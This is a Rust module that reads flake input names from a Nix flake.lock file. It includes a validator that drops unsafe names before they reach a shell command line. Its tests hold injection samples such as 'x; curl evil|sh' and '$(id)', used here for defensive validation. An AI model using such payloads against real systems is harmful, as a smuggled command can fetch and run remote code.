//! Read flake input names from a `flake.lock` file.

use anyhow::{Context, Result};
use serde_json::Value;
use std::collections::BTreeMap;
use std::path::Path;

/// True when `name` is a safe flake input name: Nix only allows
/// `[A-Za-z0-9._-]+`. Anything else could escape into the shell command line
/// built by `gui::actions`, so callers must drop such names at parse time.
pub fn is_valid_input_name(name: &str) -> bool {
    !name.is_empty()
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
}

/// Parse a `flake.lock` file and return the set of flake input names.
///
/// Input names are the keys of `root.inputs`. We map each to a last-modified
/// stamp when available (best-effort), sorted by name. Names that are not
/// valid Nix input identifiers are skipped (see [`is_valid_input_name`]).
pub fn parse_inputs(path: &Path) -> Result<BTreeMap<String, String>> {
    let raw = std::fs::read_to_string(path)
        .with_context(|| format!("reading lock file {}", path.display()))?;
    let val: Value = serde_json::from_str(&raw)
        .with_context(|| format!("parsing lock file {}", path.display()))?;

    let nodes = val.get("nodes").and_then(|n| n.as_object());
    let mut out: BTreeMap<String, String> = BTreeMap::new();

    // Primary: keys of root.inputs.
    if let Some(inputs) = val.get("root").and_then(|r| r.get("inputs")) {
        if let Some(obj) = inputs.as_object() {
            for name in obj.keys() {
                if !is_valid_input_name(name) {
                    continue;
                }
                let last = nodes
                    .and_then(|n| n.get(name))
                    .and_then(|node| node.get("locked"))
                    .and_then(|l| l.get("lastModified"))
                    .map(|v| v.to_string())
                    .unwrap_or_default();
                out.insert(name.clone(), last);
            }
        }
    }

    // Fallback: enumerable node names that look like inputs.
    if out.is_empty() {
        if let Some(nodes) = nodes {
            for (k, v) in nodes {
                if k == "root" || k == "removable" {
                    continue;
                }
                if !is_valid_input_name(k) {
                    continue;
                }
                if v.get("locked").is_some() || v.get("inputs").is_some() {
                    out.insert(k.clone(), String::new());
                }
            }
        }
    }

    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_version7_inputs() {
        let path = std::env::temp_dir().join(format!(
            "tuneshon_test_flakelock_{}.json",
            std::process::id()
        ));
        let raw = r#"{
            "nodes": {
                "nixpkgs": { "locked": { "lastModified": 1700000000 } },
                "home-manager": { "inputs": { "nixpkgs": "nixpkgs" } }
            },
            "root": {
                "inputs": { "nixpkgs": "nixpkgs", "home-manager": "home-manager" }
            },
            "root_id": "root",
            "version": 7
        }"#;
        std::fs::write(&path, raw).unwrap();

        let inputs = parse_inputs(&path).unwrap();
        std::fs::remove_file(&path).ok();

        let keys: Vec<&String> = inputs.keys().collect();
        assert_eq!(keys, vec!["home-manager", "nixpkgs"]);
        assert_eq!(inputs["nixpkgs"], "1700000000");
    }

    #[test]
    fn empty_when_missing() {
        let p = std::env::temp_dir().join("tuneshon_no_such_lock.json");
        assert!(parse_inputs(&p).is_err());
    }

    #[test]
    fn skips_invalid_input_names() {
        assert!(is_valid_input_name("nixpkgs"));
        assert!(is_valid_input_name("home_manager.1"));
        assert!(!is_valid_input_name(""));
        assert!(!is_valid_input_name("x; curl evil|sh"));
        assert!(!is_valid_input_name("$(id)"));
        assert!(!is_valid_input_name("in'quote"));
    }

    #[test]
    fn injection_names_are_dropped_from_lock() {
        let path = std::env::temp_dir().join(format!(
            "tuneshon_test_flakelock_evil_{}.json",
            std::process::id()
        ));
        let raw = r#"{
            "nodes": {
                "nixpkgs": { "locked": { "lastModified": 1700000000 } },
                "x; curl evil|sh": { "locked": { "lastModified": 1 } }
            },
            "root": {
                "inputs": { "nixpkgs": "nixpkgs", "x; curl evil|sh": "x; curl evil|sh" }
            },
            "root_id": "root",
            "version": 7
        }"#;
        std::fs::write(&path, raw).unwrap();

        let inputs = parse_inputs(&path).unwrap();
        std::fs::remove_file(&path).ok();

        assert_eq!(inputs.keys().collect::<Vec<_>>(), vec!["nixpkgs"]);
    }
}
